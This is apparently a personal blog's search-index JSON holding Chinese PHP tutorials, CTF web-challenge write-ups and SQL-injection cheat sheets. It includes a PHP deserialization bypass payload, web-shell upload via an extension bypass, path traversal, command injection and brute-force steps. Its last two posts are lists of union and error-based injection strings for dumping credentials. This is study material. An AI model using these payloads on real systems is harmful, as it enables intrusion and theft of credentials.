{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Edmund0A","url":"https://Edmund0A.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"02-07","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-07","excerpt":""}],"posts":[{"title":"php自学（二）","text":"@[TOC] 🔺 PHP运用的常见语句⚪ echo语句和print语句在PHP中有两种基本输出方式：echo和print ▲ PHP echo和print语句的区别 echo：可以输出一个或多个字符串 print：只允许输出一个字符串，返回总值为1 echo的输出速度比print要快，且echo没有返回值，而print有返回值1▲ echo语句echo作为一个语言结构，使用时对加不加括号没有严格要求，如 echo 或 echo() 都是可以的。使用echo命令输出字符串（字符串可以包含HTML标签） 举例： 123456&lt;?phpecho \"&lt;h2&gt;echo语句&lt;/h2&gt;\";echo \"Hello world!&lt;br&gt;\";echo \"PHP语法&lt;br&gt;\";echo \"这是一个\", \"字符串，\", \"使用了\", \"多个\", \"参数。\";?&gt; 输出结果：运用echo语句还能输出变量和字符串 举例： 1234567891011&lt;?php$txt1=\"学习 PHP\";$txt2=\"RUNOOB.COM\";$cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo $txt1;echo \"&lt;br&gt;\";echo \"在 $txt2 学习 PHP \";echo \"&lt;br&gt;\";echo \"我车的品牌是 &#123;$cars[0]&#125;\";?&gt; 输出结果： ▲ print语句print作为语言结构，与echo相同，对于使用括号与否也没有严格的规定。使用print命令输出字符串（字符串可以包含HTML）的例子： 12345&lt;?phpprint \"&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;\";print \"Hello world!&lt;br&gt;\";print \"我要学习 PHP!\";?&gt; 输出结果： 使用print命令输出变量和字符串： 1234567891011&lt;?php$txt1=\"学习 PHP\";$txt2=\"RUNOOB.COM\";$cars=array(\"Volvo\",\"BMW\",\"Toyota\"); print $txt1;print \"&lt;br&gt;\";print \"在 $txt2 学习 PHP \";print \"&lt;br&gt;\";print \"我车的品牌是 &#123;$cars[0]&#125;\";?&gt; 输出结果：这之中可以发现用法基本和echo语句基本相同，在此不多赘述。 ⚪ PHP EOF (heredoc PHP定界符)PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）与程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。通俗来讲，它的作用就是按照原样，包括换行格式等设置保持不变输出在其内部的东西。当使用它时需要注意几点要求： 必须后接分号，否则编译通不过。 EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。 开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。 这边用实例展示： 1234567&lt;?phpecho &lt;&lt;&lt;EOF &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落。&lt;/p&gt;EOF;// 结束需要独立一行且前后不能空格?&gt; 在这之中还要注意： 以 &lt;&lt;&lt;EOF 开始标记开始，以 EOF 结束标记结束，结束标记必须顶头写，不能有缩进和空格，且在结束标记末尾要有分号 。 开始标记和结束标记相同，比如常用大写的 EOT、EOD、EOF 来表示，但是不只限于那几个(也可以用：JSON、HTML等)，只要保证开始标记和结束标记不在正文中出现即可。 位于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。在 heredoc 中，变量不需要用连接符 . 或 , 来拼接.。 示例如下： 123456789&lt;?php$name='runoob';$a=&lt;&lt;&lt;EOF \"abc\"$name \"123\"EOF; //结束需要独立一行且前后不能有空格 ECHO $a; ?&gt; ⚪ PHP数据类型PHP主要的数据类型分为以下几类： String（字符串） Integer（整型） 整型是一个没有小数的数字。整数需要遵守的规则： 整数必须至少有一个数字 (0-9) 整数不能包含逗号或空格 整数是没有小数点的 整数可以是正数或负数 整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。 在实例中测试不同的数字：12345678910111213 &lt;?php $x = 5985;var_dump($x);echo \"&lt;br&gt;\"; $x = -345; // 负数 var_dump($x);echo \"&lt;br&gt;\"; $x = 0x8C; // 十六进制数var_dump($x);echo \"&lt;br&gt;\";$x = 047; // 八进制数var_dump($x);?&gt; （其中，PHP var_dump()函数返回变量的数据类型和值。） Float（浮点型）浮点数是带小数部分的数字，或是指数形式。在实例中测试不同的数字： 12345678910&lt;?php $x = 10.365;var_dump($x);echo \"&lt;br&gt;\"; $x = 2.4e3;var_dump($x);echo \"&lt;br&gt;\"; $x = 8E-5;var_dump($x);?&gt; （其中，PHP var_dump()函数返回变量的数据类型和值。） Boolean（布尔型）布尔型通常用于条件判断，可以是 TRUE 或 FALSE。$x=true;$y=false; Array（数组）（数组可以在一个变量中存储多个值）在以下实例中创建了一个数组， 然后使用 PHP var_dump() 函数返回数组的数据类型和值： 1234&lt;?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\");var_dump($cars);?&gt; Object（对象）对象数据类型也可以用于存储数据。在 PHP 中，对象必须声明。首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。然后我们在类中定义数据类型，然后在实例化的类中使用数据类型： 123456789101112&lt;?phpclass Car&#123; var $color; function __construct($color=\"green\") &#123; $this-&gt;color = $color; &#125; function what_color() &#123; return $this-&gt;color; &#125;&#125;?&gt; 以上实例中PHP关键字this就是指向当前对象实例的指针，不指向任何其他对象或类。 NULL（空值）NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。可以通过设置变量值为 NULL 来清空变量数据： 12345&lt;?php$x=\"Hello world!\";$x=null;var_dump($x);?&gt; 关于PHP字符串：一个字符串是一串字符的序列，可以将任何文本放在单引号和双引号中。 🔺 小结通过两次php语言入门级的初步认识，基本上对于PHP的低等运用有了头目，但是学习与否仅仅是一方面，接下来还是需要实战才能真正找出自己的缺点。对于PHP的短板一定要补好。","path":"2020/11/15/php自学（二）/","date":"11-15","excerpt":"","tags":[]},{"title":"php自学（一）","text":"@[TOC] 🔺 前言在做web题目的时候发现许多涉及到php语言的部分，说明php语言在web题目的学习过程中还是占据有挺重要的地位的（详见前面几篇博客，基本是见了php就死）所以就开一个php学习的坑，希望自己能够尽快学习完php的基本知识，以便为以后web题目的练习打好基础！ 🔺 什么是PHP PHP：Hypertext Preprocessor，是超文本预处理器的字母缩写。 PHP是一种被广泛应用的开放源代码用途的脚本语言，它可以嵌入到HTML中，尤其适合用于web开发。 与C语言或Perl语言不同，PHP并不是用大量的命令来编写程序以输出 HTML ，PHP 页面就是 HTML，只不过在其中嵌入了部分代码来执行命令。⚪ PHP的文件 PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码 PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器 PHP 文件的默认文件扩展名是 “.php”🔺 PHP的入门语法PHP 脚本以 &lt;?php 开始，以 ?&gt; 结束；比如一个可以输出字符的PHP文件代码如下： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;My first PHP page&lt;/h1&gt;&lt;?phpecho \"Hello World!\";?&gt;&lt;/body&gt;&lt;/html&gt; 注释语法：// 前缀为单行注释/* 前缀和*/后缀为多行注释 🔺 PHP的变量php中的变量与其它语言一样，通过赋予字符值来使其拥有运算性质，被称作变量；php通常通过这种方式来为变量赋值与运算： 123456&lt;?php$x=5;$y=6;$z=$x+$y;echo $z;?&gt; 通常，php语言遵守一个变量规则： 变量以 $ 符号开始，后面跟着变量的名称 变量名必须以字母或者下划线字符开始 变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ） 变量名不能包含空格 变量名区分大小写（这点尤为强调！$y 和 $Y 是算作两个不同的变量） 变量在被第一次赋值时就被创建 php语言算作一类弱语言，因而在我们创建并使用时不需要声明PHP变量的数据类型。 ⚪函数变量的作用域php变量的作用域分为四种：local（局部作用域），global（全局作用域），static（静态作用域），parameter（函数参数作用域）。 ▲局部作用域（local）和全局作用域（global）在php规定的变量分为局部变量和全局变量两种，其中在所有函数外部定义的变量拥有全局作用域，除了函数外可以被脚本中的任何部分访问；而如果想要在函数中访问一个全局变量则需要使用global关键字。在PHP函数内部声明的变量是局部变量，仅仅能够在函数内部访问。举个例子： 12345678910111213141516171819&lt;?php$x=5; // 全局变量function myTest()&#123; $y=10; // 局部变量 echo \"&lt;p&gt;测试函数内变量:&lt;p&gt;\"; echo \"变量 x 为: $x\"; echo \"&lt;br&gt;\"; echo \"变量 y 为: $y\";&#125; myTest();echo \"&lt;p&gt;测试函数外变量:&lt;p&gt;\";echo \"变量 x 为: $x\";echo \"&lt;br&gt;\";echo \"变量 y 为: $y\";?&gt; 不难看出，在这个示例中，首先公布的变量x不属于任何一个函数，属于全局变量；而在函数内部规定出来的y则属于局部变量。因此最后只能成功输出x的值而不能够输出y的值。当然，如果想要在函数内部访问到全局变量的值也不是不可以。global关键字是用于函数内部访问全局变量，如果想要在函数内部调用全局变量，则需要在函数中变量前加上global关键字。比如在函数中我们声明一个局部变量x可以直接输入 $y ，而声明全局变量就是 global $x 。而PHP还将所有全局变量储存在一个名为$GLOBALS[index] 的数组中 （index保存变量的名称） ，因此引用全局变量x还可以直接输入 $GLOBALS[&#39;y&#39;] ，该数组也可以直接用来更新全局变量。 ▲ 静态作用域（static）该关键字运用于完成函数后对于某个局部变量的保存。当一个函数完成后想要保存局部变量x，此时，为了防止这个局部变量被删除，可以使用static关键字：static $x 。（这之后，每次调用该函数时，该变量都会保留上一次函数被调用时的值）举例如下： 123456789101112&lt;?phpfunction test()&#123; static $x=0;//静态声明赋予一个初始值0 echo $x . \" ; $x++;&#125;test();//第一次调用test();//第二次调用test();//第三次调用test();//第四次调用&gt; 其中可以看到，四次调用每次依次递增。 ▲ 参数作用域（parameter）参数是通过调用代码将值传递给函数的局部变量。关于局部变量和全局变量的优先级，因为在PHP中函数都有自己单独的作用域，因此在不声明这个变量之前，局部变量的优先级是大于全局变量的。在声明之后该变量就变成了局部变量，修改值的话全局变量的值也会被改变。 综合知识点举例1234567891011121314151617181920212223242526272829303132333435&lt;?php$a = 10;//全局变量 1$b = 5; //全局变量 2function test()&#123; $a = 15;// 声明一个局部变量a的值为15 $b = 5; // 声明一个局部变量b的值为5 $z = $a-$b; // z = 15 - 5 = 10 echo $z; // z的值为10&#125;test();function test1()&#123; global $a,$b; $a = 15;// 在函数中声明全局变量a并将值改为15 $b = 5; // 在函数中声明全局变量b并将值改为5 $z = $a-$b; echo PHP_EOL; echo $z;&#125;test1();function test2()&#123; global $a,$b; $z= $a-$b; //z= 15 - 10 = 10 echo PHP_EOL; echo $z;&#125;test2();?&gt; 结果：10 10 10","path":"2020/11/11/php自学（一）/","date":"11-11","excerpt":"","tags":[]},{"title":"攻防世界web进阶篇（三）（Web_php_unserialize）（upload1）","text":"🔺心得经过前面几次的刷题练习， 发现我对于php基本语言的掌握情况还很不尽人意，于是后几次刷题目标主要就是加强对于php语言方面的训练。 ⚪Web_php_unserialize本题目主要考点是php的基本语言综合运用，其中涉及但不仅仅有： 1private、function、_wakeup、_destruct 等几类语言的基本运用。本题知识点（大佬总结）： 1、construct()：当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数）2、destruct()：当对象被销毁时会自动调用。（析构函数）3、__wakeup()：unserialize() 时会自动调用。 首先看题：unserialize和上一次的一道题目名字非常相似，进入题目查看后发现都涉及有_wakeup的用法，首先我们来看源码，它定义了一个Demo类，然后发现初始化改变file值。其中还给了我们一段注释：//the secret is in the fl4g.php 告诉我们flag存在于fl4g.php这个页面。 我们可以直接在线进行反序列化（在线代码运行网站），来获得fl4g.php的内容。在运行的时候我们要注意绕过preg_match 和 _wakeup 函数 我们继续往后看， 12function __destruct() &#123; echo @highlight_file($this-&gt;file, true); 意思是若Demo类被销毁，会高亮显示file指向的文件内容。而且本题目的关键是进行反序列化后会自动执行的 _wakeup 函数，因此想要正常执行必须要绕过这个函数。 1234567891011if (isset($_GET[&#39;var&#39;])) &#123; $var &#x3D; base64_decode($_GET[&#39;var&#39;]); if (preg_match(&#39;&#x2F;[oc]:\\d+:&#x2F;i&#39;, $var)) &#123; die(&#39;stop hacking!&#39;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; 这里进行了变量的传入，可以使用ET传参的方法：1.首先base64加密2.使用了preg_match()匹配函数，如果匹配上了，就结束，否则 1@unserialize($var); 所以这里要想办法绕过这个匹配函数。因而需要运行以下代码： 12345678910111213141516&lt;?php class Demo &#123; private $file &#x3D; &#39;index.php&#39;; public function __construct($file) &#123; $this-&gt;file &#x3D; $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123; &#x2F;&#x2F;the secret is in the fl4g.php $this-&gt;file &#x3D; &#39;index.php&#39;; &#125; &#125; &#125; 其中具体反序列化步骤代码： 12345678910&lt;?php class Demo &#123; private $file &#x3D; &#39;fl4g.php&#39;;&#125;$x&#x3D; serialize(new Demo);$x&#x3D;str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$x);&#x2F;&#x2F;绕过preg_match()$x&#x3D;str_replace(&#39;:1:&#39;, &#39;:3:&#39;,$x);&#x2F;&#x2F;绕过__wakeup()echo base64_encode($x);?&gt; 最后得到了一串字符：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==我们在这里用var传参，就可以得到flag：本题结束。 ⚪ upload1本题目推荐工具：*中国菜刀或中国蚁剑**由于看题目我们得不出有用的信息，因此直接进入整题页面：可以看到要选择文件上传，首先随便上传一个文件来看下是否会在上传后出现提示： 没有返回任何值，推测可能是要上传符合题目要求的文件才可以看到flag。因此回到初始题目页面后，先查看源码：首先尝试上传一个木马文件来试探一下 （真坏啊小伙子） ，然后打开中国蚁剑连接目录看一下可不可以获取flag，发现当我们尝试上传非图片文件的时候是无法正常上传的，页面会把上传按钮变为不可点击状态: 并且从蚁剑来看没有有用信息的返回结果，最终以失败告终 （害人之心不可有） ，既然上传文件都是同一个响应，那么就需要换一个思路来思考。我们打开网页源码，来剖析一下php语言中是否有暗藏玄机：（那个一句哈文件是我给写的一句话木马起的名字，无需在意） ，看其中有两段是关于上传文件的要求相关的，各自的意思是： ext = name.replace(/^.+./,’’) —— 删除文件的名称。 if([‘jpg’,‘png’].contains(ext)) —— 检查后缀是否为jpg，如果不是就禁用按钮并弹窗报错。 想要上传正常查看网页中暗藏的文件，就要取消这两个限制。首先我们将木马文件后缀改为jpg或者png格式来过了上传的第一关，之后我们打开burpsuite，在上传后及时抓包，将所上传的图片文件后缀改为php格式以确保其可以正常上传： 更改过后继续上传，回到题目页面，它会给出一个上传名称，这个上传名称其实就是储存着flag的路径，这里使用蚁剑或菜刀来尝试打开以上传名称为路径的文件，寻找到flag文件后就能获得flag。*按理来讲到了这一步其实就结束了，但是不知道什么原因在我的电脑上用一样的步骤甚至无法连接后门，而在学长的电脑上就可以打开文件，所以这道题到这里应该就算结束了（","path":"2020/10/12/攻防世界web进阶篇（三）（Web_php_unserialize）（upload1）/","date":"10-12","excerpt":"","tags":[]},{"title":"攻防世界web进阶篇（二）（Training-WWW-Robots   ※unserialize3）","text":"⚪Training-WWW-Robots这道题目属于考验对于robots协议掌握程度，它的解题难度并不高，只有简单几步。首先我们看题：很显然该题目的考点已经写在上面了，那么我们打开题目页面之后直接就去尝试查看robots协议：发现已经把flag的地址给出了。打开地址即可得到我们需要的flag：本题结束。 ⚪ ※ unserialize3（又是一道考验php语言功底的题目，我无了）首先看题目：“没有给出任何提示。。再打开题目页面：是一串php语言编码 （心里一凉） ，经过资料的查找，总算是大概搞懂了这几段代码里面重要元素的意思：首先，__wakeup这段 __wakeup经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 所以可以猜测被反序列化了但是可以看到这里没有特别对哪个字符串序列化，所以把xctf类实例化后，进行反序列化。利用php中的new运算符，实例化类xctf。【说人话的话意思就是：通过 _wakeup 这个代码可以看出来这段代码可以被反序列化漏洞作为突破点，而进行漏洞击破则需要我们绕过 _wakeup 这个函数以避免被exit掉。】而反序列化漏洞的原理是（以下引自大佬博客，这些以我的水平还无法触及orz） 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。我们在本地搭环境获得序列化的值 12345678910&lt;?php class xctf&#123;public $flag &#x3D; &#39;111&#39;;public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;&#125;$x&#x3D;new xctf();echo serialize($x);?&gt; 获取的序列化值：O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;} 传入code参数后可获得flag。【yysy这题真的给我搞麻了，理解反序列化花了不少时间，因此打上了代表高难的“※”标】","path":"2020/10/04/攻防世界web进阶篇（二）（Training-WWW-Robots   ※unserialize3）/","date":"10-04","excerpt":"","tags":[]},{"title":"攻防世界web进阶篇（一）（baby_web   warmup）","text":"🔺 前言在经过攻防世界新手篇web题目的洗礼后，深知了自己的无力，认识到学习web是一个任重而道远的过程，题目样式的多变性是其不变的特点，但是本人深知一句话，对于敢于挑战更难题目的人来说，未来的道路永远是为他而不断延伸的（意思就是，不要停下来刷题的脚步啊）。 ⚪ baby_web照常，我们首先审题。题目给的描述里有说“想想初始的页面是哪个”，那么该题目有可能是对于页面更改有关，我们来打开题目页面：有了题目给的提示，我们所要注意的点其实就只有地址栏一个地方了。我们发现转移到的地址并不是一般的地址，后面是跟着一个“1.php”的，也就是说这个并不是默认地址。那么就需要想个办法把默认地址搞出来，初步推测flag就在其中了。我们继续祭出老大哥 “burpsuite” （大哥今天我们去堵谁） ，来截取这个网站强行让他转移到初始网址。经过抓包后，发现了开头的异样： 好 家 伙 ！想不到这道题目浓眉大眼的居然还藏着这一手 ，发现原因后直接改成index.php来让他强行转到初始页面，在发送给Repeater并改正后，直接发送，这时候我们可以看到他隐藏的flag提示。yysy你就算说了Flag不在这里我也不会信 ，找到flag，得到答案，此题结束。 ⚪ ※warmup yysy这道题目让我感受到了深深的无力，毫不留情的解开我刷题不足的现实。。因为这道题考点很简单一点也不复杂，就只考验了php基本语言语法的用法，而我在这道题上面耗了老久（X_x）还是得继续努力啊 那么首先看题目， 好，打开题目网站，只见一张滑稽大脸糊过来，题目上也没有任何提示 （而如今一道这么简单的题目我浪费这么大力气。。我感觉这个滑稽就是在嘲讽我一样） ，那么就一如往常打开源码，发现源码中有一点提示：题目给了我们一个后缀&lt;!--source.php--&gt;，我们尝试在地址栏最后加入，可以发现网页发生了变化，出来了一串php语言文字： 解题的关键不出意外就在这些php语言编码之中 （我丢人的开始） ，先审计php代码，从前面几行我们可以看到 $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; ，可以得到另一个地址，在地址栏后面换成” /hint.php “后,转入的新页面： 都吼起来了，那么答案应该就藏在这一页的某处，需要我们自主去寻找了。我们继续看源码： 12345678910if (! empty($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;$_REQUEST[&#39;file&#39;] &#x2F;&#x2F;值非空&amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;$_REQUEST[&#39;file&#39;]&#x2F;&#x2F;值为字符串 &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;能够通过checkFile函数校验) &#123;include $_REQUEST[&#39;file&#39;]; &#x2F;&#x2F;包含$_REQUEST[&#39;file&#39;]文件exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#x2F;&#x2F;打印大号滑稽 &#125; 发现这段源码要求我们符合几个条件才能得到flag，即对于值的要求是：&lt;值为非空&gt;&lt;值为字符串&gt;&lt;能够通过checkFile()的检验&gt;。这之后我们再看checkfile()代码，可以发现其中包含着四个if语句。而其中各个if语句的含义是： 第一个if语句对变量进行检验，要求$page为字符串，否则返回false；第二个if语句判断 $page 是否存在于 $whitelist数组 中，存在则返回true；第三个if语句判断截取后的 $page 是否存在于 $whitelist数组 中，截取 $page 中“?”前部分，存在则返回true；第四个if语句判断url解码并截取后的 $page 是否存在于 $whitelist 中，存在则返回true。 若以上四个if语句均未返回值，则返回false；有三个if语句可以返回true，第二个语句直接判断 $page ，不可用；第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用；第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../ffffllllaaaagggg经过测试发现无返回值，这可能是因为我们不知道ffffllllaaaagggg文件存放的具体位置，所以依次增加`../`,最终成功拿到flag。(这一段是参考别人博客整的，因为以个人水平实在有些难以理解，研究许久也只是一知半解，但大概得知了flag的获取方式)","path":"2020/09/30/攻防世界web进阶篇（一）（baby_web   warmup）/","date":"09-30","excerpt":"","tags":[]},{"title":"攻防世界题目回顾（新手题目  中）","text":"🔺 题目及解题思路⚪ 第五题首先进行审题，发现这道题目与网页按钮配置有关。此题个人学习到的一共是有两种解题思路。 ▲ 第一种直接更改参数让按钮从无法点击的状态变成可以点击的状态。 查看网站源码来寻找网站按钮参数。发现按键的可使用权限是“disabled”状态。想要让他可以被按下，那么就把“disabled”去掉，让他变成可按下状态便可直接得到flag。 ▲ 第二种直通过查看源码得知返回某个值的时候可以得到flag。 查看源码内容得知，“value=”flag” name=”auth””，则可以向这个网站返回一个名为auth变量为flag的值：执行，便可得到flag。 ⚪ 第六题审题发现该题目是密码有关题目。首先打开答题网站，得知了该题目的基本形式，是一个包含有用户名和用户密码的登录框。这边随意输入一个用户名和密码试登录，意料之中的是网页返回了一个报错提示，提示了用户名应该为“admin”；利用admin作为用户名登陆后，跳到了check.php页面，而且这次返回了一个“error”报错。此时查看网页源码，还会发现一个提示“maybe you need a dictionary”，而恰好有个密码破解工具的一个数据包就被称作为“字典‘，就是burp suite。这个时候便可开始使用burp suite来进行密码拦截爆破。使用burpsuite的时候，从github上下载一个足够强大的字典，之后直接把截获下来的登陆数据返还给intruder来进行暴力破解。 最后返回的值中只有一个长度不一样，即为我们所需求的密码。（这边字典里直接就有密码123456） ⚪ 第七题这边看到第七题题目发现是有关cookie的内容，这边建议可以cookie quick manager插件来进行查看cookie。进入题目页面：打开cookie quick manager，直接查看这个网址的cookie数据，发现线索：“cookie.php”。将这个后缀直接加到网址后面可以进入一个新的页面获得一个新的提示。“see the http response”意思要看该网址返回来的数据是什么。因此直接F12调出源码查看，获得flag。 ⚪ 第九题这道题的题目是考验对于网址命令运用的熟悉程度，以ping为基础的知识是必备知识。进入所给网页后，发现给予了一个ping’指令框，因此尝试在其中填入本机地址和find指令寻找本机该地址所有的“.txt”后缀的文件中是否存在有flag（指令为 [本机地址] | find / -name “*.txt” ）。输入后可以发现一个名为“flag.txt”的文件，很明显flag就在其中，而我们所需要的就是打开这个文件来获取到flag。想要打开这个文件就需要用cat指令（指令为 [本机地址] | cat /home/flag.txt )，输入后即可得到flag。 🔺 5~8题结束。","path":"2020/09/21/攻防世界题目回顾（新手题目  中）/","date":"09-21","excerpt":"","tags":[]},{"title":"攻防世界题目回顾（新手题目  上）","text":"🔺一 前言由于一整个暑假的打工和学习驾驶考试的原因，对于web方面的学习有所欠缺，因此重新进行新型简单题目联系来试图回到之前的学习状态。最近在攻防世界开始自己的web学习，附带有个人思维向的解题思路和步骤。 🔺 二 题目及解题思路⚪ 第一题这道题还是很简单的，首先看题目审题。查看网页源代码，那就想都不想直接F12，发现flag在源码注释中。此题解出； ⚪ 第二题看题目，题目要求使用get方式提交一个名为a值为1的变量。提示就把解题方法写在上面了，那么照做就是答案。首先get一下a=1； 这时候会出来第二个提示，跟着提示祭出Hackbar，照做，此题得解。 ⚪ 第三题看到题目，我的第一想法就是先F12查看源码，然而出题者早已经有预料：既然这里没有那就换条思路，这道题题目中涉及到了robots协议，那就直接打开这个网站的robots文档：我一开始比较迟钝，感觉虽然出题人没有明写出来，但是说明了flag就在这里，就一直在源码里寻找注释，然而最后才注意到那个后缀，其实很简单，再把后缀加上去打开这个文件就可以得到flag。 ⚪ 第四题进入第四题之前需要明晰一点知识，就是常见的备份文件后缀名有“.git” 、“.svn”、“ .swp”、“.~”、“.bak”、“.bash_history”和“.bkf” 七种。其实知道上面的知识就已经得到答案了，直接加上备份后缀逐一查看他的备份文件，尝试出“index.php.bak”加上备份后缀后下载备份文件，其中便是flag。 🔺 前四题结束。","path":"2020/09/19/攻防世界题目回顾（新手题目  上）/","date":"09-19","excerpt":"","tags":[]},{"title":"联合查询注入 2","text":"🔺 常用语句▲ 判断有无注入点; and 1=1 and 1=2 ▲ 猜表一般的表的名称无非是admin adminuser user pass password 等.. 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 1234and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0)▲ 猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止 12345678and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确▲ 猜解字 符 12and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位 and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位 就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 1and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) -- 这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符. 1234567891011group by users.id having 1=1-- group by users.id, users.username, users.password, users.privs having 1=1-- ; insert into users values( 666, attacker, foobar, 0xffff )--UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable- UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id)- UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id,login_blank&gt;_name)- UNION SELECT TOP 1 login_blank&gt;_name FROM logintable- UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul-- ▲ 看_blank&gt;服务器打的补丁=出错了打了SP4补丁 1and 1=(select @@VERSION)-- ▲ 看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。 1and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))-- ▲ 判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA） 123and sa=(SELECT System_blank&gt;_user)-- and user_blank&gt;_name()=dbo-- and 0&lt;&gt;(select user_blank&gt;_name()--","path":"2020/08/16/联合查询注入 2/","date":"08-16","excerpt":"","tags":[]},{"title":"sql注入基本笔记_1","text":"union 联合查询🔺查询当前数据库名报错的语法 1（如and1=2）+ union select 1,database() 🔺查询当前数据库版本 1union select 1,version() 🔺查询当前数据库 表名 1union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 🔺查询当前数据库所有表，并且拼接在一行显示 1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 🔺查询当前数据库users中表所有字段，并且拼接在一行显示 1union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 🔺查询当前数据库users中表username和password字段中的信息，并且拼接在一行显示 1union select 1,group_concat(username,0x3a,password),3 from users--+ 联合查询报错型注入🔺加单引号报错，然后在回显点显示当前数据库所有表，并且拼接在一行显示 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ 🔺爆字段 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+ 🔺爆值 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+ updatexml报错注入🔺爆数据库版本信息 1?id=1' anandd（双写and绕过waf） updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --+ 🔺链接用户 1?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) 🔺爆库 1updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆表 1?id=1 and 